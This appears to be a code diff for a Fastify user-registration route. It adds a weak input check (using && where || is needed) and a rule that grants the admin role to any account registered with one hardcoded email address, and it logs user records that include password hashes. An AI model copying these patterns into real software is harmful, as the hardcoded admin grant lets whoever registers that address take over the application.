@@ -13,6 +13,9 @@ function userRoutes(fastify, options, done) {
                 role: "user",
                 createdAt: Date(),
             };
+            if (!newUser.mailId && !newUser.password) {
+                throw new Error('provide Required Input');
+            }
             newUser.password = await bcrypt.hash(newUser.password, 8);
             console.log('NEW USER', newUser);
             Object.entries(newUser).forEach((entry) => {
@@ -25,6 +28,9 @@ function userRoutes(fastify, options, done) {
             if (userInfo == null) {
                 const users = await userRepo.save(newUser);
                 console.log("New user of the library --->", users);
+                if (users.mailId == 'anoop@surfboard.se') {
+                    const updateUser = await userRepo.update(users.userId, { role: 'admin' });
+                }
                 return {
                     status: "SUCCESS",
                     data: users,
